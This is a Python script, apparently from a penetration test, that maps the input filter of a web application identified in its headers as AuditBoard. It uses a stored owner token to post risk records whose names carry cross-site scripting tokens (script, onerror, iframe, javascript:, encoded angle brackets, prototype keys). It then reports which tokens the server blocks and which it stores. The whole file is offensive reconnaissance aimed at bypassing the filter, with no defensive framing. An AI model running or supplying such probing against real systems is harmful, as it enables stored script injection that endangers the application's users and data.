import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def call(m,p,body=None):
    cmd=['curl','-s','-m','25','-o','/tmp/hb','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/hb',encoding='utf-8',errors='replace').read()
tag='ZXC'+uuid.uuid4().hex[:5]
# probe the blocklist: which tokens trigger 403?
tokens=['svg','SVG','SvG','script','SCRIPT','onerror','onload','onclick','javascript',
        'alert','prompt','confirm','iframe','object','embed','form','input','body',
        '{{','}}','{%','eval','expression','document','window','cookie','constructor',
        '__proto__','prototype','<b>','<i>','<p>','<a ','<div','<span','<style','<link',
        'data:','vbscript','&#','\\x3c','%3c','&lt;']
print(f"{'token':16} {'code':>5}  stored/err")
blocked=[]; allowed=[]
for t in tokens:
    pay=f'{t}ZX{tag}'
    c,b=call('POST','/api/v1/risks',{"risk":{"name":pay}})
    if c=='403': blocked.append(t)
    elif c in ('200','201'):
        allowed.append(t)
        try: st=repr(json.loads(b)['risks'][0].get('name'))[:50]
        except: st=''
    else:
        try: st=json.loads(b).get('errors',[{}])[0].get('detail','')[:50]
        except: st=b[:50]
    print(f"{t:16} {c:>5}  {st if c!='403' else 'BLOCKED'}")
print(f"\nBLOCKED ({len(blocked)}): {blocked}")
print(f"ALLOWED ({len(allowed)}): {allowed}")
